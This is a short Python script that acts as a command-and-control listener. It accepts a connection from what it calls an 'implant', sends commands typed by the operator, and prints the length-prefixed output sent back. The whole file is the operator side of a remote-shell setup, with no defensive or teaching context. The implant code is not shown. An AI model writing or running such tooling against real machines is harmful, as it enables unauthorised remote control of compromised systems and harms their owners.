import socket

def receive_all(sock, length):
    data = ''
    while len(data) < length:
        more = sock.recv(length - len(data)).decode()
        if not more:
            break
        data += more
    return data

def main():
    host = '127.0.0.1'
    port = 9999
    
    with socket.socket() as s:
        s.bind((host, port))
        s.listen(1)
        print("Server listening on {}:{}".format(host, port))
        
        conn, addr = s.accept()
        with conn:
            print("Connected to implant at", addr)
            
            while True:
                command = input("Enter command: ").strip()
                if command:
                    conn.send(command.encode())
                    response_length = int(conn.recv(10).decode())  # First read the length of the response
                    response = receive_all(conn, response_length)
                    print("Response:", response)

if __name__ == '__main__':
    main()
